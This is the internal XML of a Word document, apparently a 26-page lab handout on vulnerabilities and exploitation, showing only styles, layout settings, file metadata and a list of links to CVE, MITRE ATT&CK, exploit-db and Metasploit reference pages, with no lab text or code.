    <w:name w:val="Comment Text Char"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF377E"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DocName">
    <w:name w:val="DocName"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00CE6287"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:i w:val="0"/>
      <w:iCs/>
      <w:sz w:val="17"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008C2E88"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:rsid w:val="00F6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ITCaption">
    <w:name w:val="SAIT Caption"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="120"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Source">
    <w:name w:val="Source"/>
    <w:basedOn w:val="SAITCaption"/>
    <w:qFormat/>
    <w:rsid w:val="00C72591"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:b w:val="0"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="SchoolName">
    <w:name w:val="School Name"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="000537E5"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial Black" w:hAnsi="Arial Black"/>
      <w:b/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CourseName">
    <w:name w:val="Course Name"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00A70299"/>
    <w:pPr>
      <w:spacing w:after="200" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="LabTitle">
    <w:name w:val="Lab Title"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00A70299"/>
    <w:pPr>
      <w:spacing w:after="200" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TitlePageCourseName">
    <w:name w:val="Title Page Course Name"/>
    <w:basedOn w:val="CourseName"/>
    <w:qFormat/>
    <w:rsid w:val="00242511"/>
    <w:rPr>
      <w:rFonts w:ascii="Titillium" w:hAnsi="Titillium"/>
      <w:sz w:val="120"/>
      <w:szCs w:val="120"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TitlePageModuleTitle">
    <w:name w:val="Title Page Module Title"/>
    <w:basedOn w:val="LabTitle"/>
    <w:qFormat/>
    <w:rsid w:val="00242511"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Titillium" w:hAnsi="Titillium"/>
      <w:color w:val="005EB8"/>
      <w:sz w:val="40"/>
      <w:szCs w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="PageNo">
    <w:name w:val="Page No."/>
    <w:basedOn w:val="Footer"/>
    <w:qFormat/>
    <w:rsid w:val="001E692B"/>
    <w:pPr>
      <w:jc w:val="right"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Copyright">
    <w:name w:val="Copyright"/>
    <w:basedOn w:val="Footer"/>
    <w:qFormat/>
    <w:rsid w:val="00A70299"/>
    <w:rPr>
      <w:b w:val="0"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006F1DC3"/>
    <w:rPr>
      <w:color w:val="800080" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00CB761D"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="WW-BodyText2">
    <w:name w:val="WW-Body Text 2"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F5614E"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="PlainText">
    <w:name w:val="Plain Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="PlainTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004F1E7E"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cstheme="minorBidi"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
      <w:lang w:val="en-CA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PlainTextChar">
    <w:name w:val="Plain Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="PlainText"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="004F1E7E"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cstheme="minorBidi"/>
      <w:sz w:val="21"/>
      <w:szCs w:val="21"/>
      <w:lang w:val="en-CA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DB0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DB0BEB"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCode">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DB0B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3536">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="488834496">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="545265794">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="743066496">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="918371179">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="2008551206">
          <w:marLeft w:val="360"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="200"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1490753853">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="539054659">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="264390471">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="948850539">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="89931518">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="1827865904">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1863468467">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1892691765">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1162626993">
          <w:marLeft w:val="360"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="200"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="566036382">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="1678918714">
          <w:marLeft w:val="1080"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="100"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="76874454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vd.nist.gov/vuln-metrics/cvss" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cyber.gc.ca/en/alerts-advisories" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/"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ve.mitre.org/" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cve.mitre.org/about/index.html" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.exploit-db.com" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.exploit-db.com/exploits/41891" TargetMode="External"/><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cvedetails.com/" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/" TargetMode="External"/><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cve.mitre.org/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cwe.mitre.org/data/" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nmap.or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offensive-security.com/metasploit-unleashed/msfconsole-commands/" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><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www.cvedetails.com/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://support.microsoft.com/en-us/help/4571741/windows-10-update-kb4571741"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hyperlink" Target="https://www.exploit-db.com/exploits/42315" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/matrices/enterprise/" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.offensive-security.com/metasploit-unleashed/about-meterprete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vd.nist.gov/vuln-metrics/cvss"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www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue" TargetMode="External"/><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_rels/header2.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.jpg"/></Relationships>
</file>

<file path=word/_rels/header3.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.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gge\Desktop\er-template-4-word-97-2003-june-6-2013-10-06-13%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1557F9-E7C0-49F0-8673-9826ADC66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(1).dot</Template>
  <TotalTime>16244</TotalTime>
  <Pages>26</Pages>
  <Words>3598</Words>
  <Characters>20512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24062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coleton sanheim</cp:lastModifiedBy>
  <cp:revision>249</cp:revision>
  <cp:lastPrinted>2020-01-06T15:06:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-07-29T18:29:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-01-19T03:12:00Z</dcterms:modified>
</cp:coreProperties>
</file>